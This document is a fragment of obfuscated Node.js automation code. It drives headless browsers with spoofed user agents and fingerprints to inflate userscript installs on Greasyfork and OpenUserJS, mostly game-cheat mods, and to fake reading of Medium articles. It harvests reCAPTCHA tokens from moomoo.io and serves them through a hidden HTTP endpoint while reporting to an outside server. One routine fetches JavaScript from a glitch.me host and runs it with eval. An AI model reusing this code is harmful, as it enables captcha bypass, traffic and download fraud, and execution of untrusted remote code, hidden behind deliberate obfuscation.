      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + a1(0x10) + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + Z(0x12) + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + Z(0x4) + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + Z(0x7) + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + Y(0x3, 'GK9l') + Z(0x1c) + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + Z(0x2) + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x257 + -0x2 * 0xfa8 + -0x1cf9 * -0x1
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x1 * 0x1bbf + -0x1 * -0x1c26 + 0x67 * -0x1)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x27 * 0x29 + -0xb6 * -0x29 + 0x67 * -0x57), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x1ba4 + -0x11bc + -0x4 * 0x261), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x22e + -0x71 * 0x1a + 0xda8;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0xe84 + 0x1431 + -0x1 * 0x5ad; w < getRandomInt(-0x25b0 + -0x3 * 0x588 + 0x3649, 0x1212 + -0x38 * -0x8d + -0x30e5); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x1a55b * -0x1 + -0x44 * -0x4b2 + -0x1fa43);
        }
      }();
    }, 0x8e7 + -0x95c + 0xd9), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      const a3 = d,
        a2 = b;

      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x14e1 + -0x9f * 0x11 + 0x1f70;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v[a2(0x1a, 'y##[')](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate'](a3(0x11) + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x22ec + 0x1727 * 0x1 + 0xbc5, 0xa * 0x52 + 0x1 * 0xcfb + 0x1 * -0xffd)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x99bf + 0x1 * -0x64bb + 0x402c);
    }, 0x1607 * 0x1 + -0x2 * -0x812 + 0x13 * -0x1fd), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x2b8 * 0x5 + -0x16 * -0x16a + 0xec * -0x13;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x7b5 * -0x2 + 0x1bb7 + -0x1f69), await u['evaluate'](() => {
            const a4 = d;
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + a4(0x5) + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x1fef + 0x307 + 0x1ce8), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x1c * 0xd5e1 + -0x4e * -0x51ac + -0x1aa3 * 0x14c);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0xf * 0x92 + -0x3e + 0x4 * -0x1fb);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0xf5 * 0x11 + -0x18 * 0x8a + -0x1dfd * -0x1);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x454 * -0x7 + 0xfe7 * 0x3 + -0x2e71);
}
doFlags['doOUJS'] && ((async () => {
  const a6 = b;
  async function f() {
    const a5 = b,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0xa04 + 0x171d + -0x2 * 0x68c) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x233 * -0x6 + 0x15 * 0x3a + -0x871 * -0x1));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x1d86 * 0x1 + -0xf * -0xba + 0x12a0, D['indexOf']('\x20'));
        return B ? E['slice'](-0x6f8 + 0x5 * -0x343 + -0x1 * -0x1747, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x101 * 0x12 + -0x1fc * 0x1 + 0xad * 0x22),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x740 + -0x2 * -0x66d + 0x2176),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + a5(0x16, 'F3Vd'),
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + a6(0x1e, 'hRuv') + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
